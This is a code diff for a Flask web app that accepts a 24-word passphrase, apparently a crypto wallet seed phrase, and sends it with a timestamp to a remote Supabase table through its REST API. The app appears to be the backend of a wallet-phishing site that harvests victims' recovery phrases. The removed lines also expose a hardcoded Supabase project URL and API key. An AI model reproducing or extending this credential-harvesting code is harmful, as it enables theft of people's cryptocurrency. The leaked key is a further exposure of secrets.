@@ -1,13 +1,14 @@
 from flask import Flask, render_template, request, redirect
-from supabase import create_client, Client
+import requests
+import os
+from datetime import datetime
 
 app = Flask(__name__, static_folder='static', template_folder='.')
 
-# Supabase credentials
-SUPABASE_URL = "https://ixqiadgvovxozexatyta.supabase.co"
-SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml4cWlhZGd2b3Z4b3pleGF0eXRhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDgxNjk5ODcsImV4cCI6MjA2Mzc0NTk4N30.yXPGI9RR_H4N9Ocp4FQGgh4ycDFRz9cfUEkX_PdTJos"
-
-supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+# Supabase config from environment variables
+SUPABASE_URL = os.environ.get("SUPABASE_URL")
+SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
+SUPABASE_TABLE = "passphrases_new"
 
 @app.route('/')
 def index():
@@ -19,14 +20,34 @@ def passphrase():
 
 @app.route('/submit-passphrase', methods=["POST"])
 def submit_passphrase():
-    passphrase = request.form.get("passphrase", "")
-    words = passphrase.strip().split()
+    passphrase = request.form.get("passphrase", "").strip()
+    words = passphrase.split()
     if len(words) != 24:
-        return "Invalid passphrase. It must be exactly 24 words.", 400
+        return "Invalid passphrase. Must be 24 words.", 400
 
     # Save passphrase to Supabase
-    data = {"phrase": passphrase.strip()}
-    supabase.table("passphrases").insert(data).execute()
+    headers = {
+        "apikey": SUPABASE_KEY,
+        "Authorization": f"Bearer {SUPABASE_KEY}",
+        "Content-Type": "application/json",
+        "Prefer": "return=representation"
+    }
+
+    payload = {
+        "passphrase": passphrase,
+        "timestamp": datetime.utcnow().isoformat()
+    }
+
+    try:
+        response = requests.post(
+            f"{SUPABASE_URL}/rest/v1/{SUPABASE_TABLE}",
+            headers=headers,
+            json=payload
+        )
+        if response.status_code not in [200, 201]:
+            return f"Error saving passphrase: {response.text}", 500
+    except Exception as e:
+        return f"Exception occurred: {e}", 500
 
     return redirect("/confirmation")
 
